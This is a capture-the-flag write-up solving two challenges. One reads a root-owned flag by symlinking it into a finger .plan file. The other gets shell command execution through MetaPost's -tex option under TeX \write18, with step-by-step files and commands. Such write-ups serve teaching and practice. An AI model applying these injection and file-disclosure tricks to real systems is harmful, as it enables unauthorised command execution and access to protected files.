0x90s
=====

0x90s was a qemu image of an old slackware install. After logging in with the supplied credentials (`challenge/challenge`) you quickly found the flag in the / directory but without the permissions to access it. While looking around for something to exploit I noticed finger running with root privileges.

```
$ ln -s /flag /home/challenge/.plan
$ finger -l challenge@localhost`
```

pdfmaker
========

```
[fengor@chaos ~]$ cat x.mp
verbatimtex
\documentclass{minimal}\begin{document}
etex beginfig (1) label(btex blah etex, origin);
endfig; \end{document} bye

[fengor@chaos ~]$ cat pdfmaker.tex 
\documentclass{article}
\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;cwd;ls)>flag2.tex" "x.mp"}
\end{document}


[fengor@chaos ~]$ cat showflag.tex 
\documentclass{article}
\begin{document}
\newread\file
\immediate\openin\file=
\immediate\read\file to \line
\immediate\typeout\line
\immediate\closeout\file
\end{document}
```

1. login to pdfmaker
2. create mp x ( see x.mp above)
3. create tex pdfmaker (see pdfmaker.tex above)
4. compile pdfmaker
5. show tex flag2 and note down filename
6. create tex showflag and add filename after file=
7. compile showflag
8. show log showflag
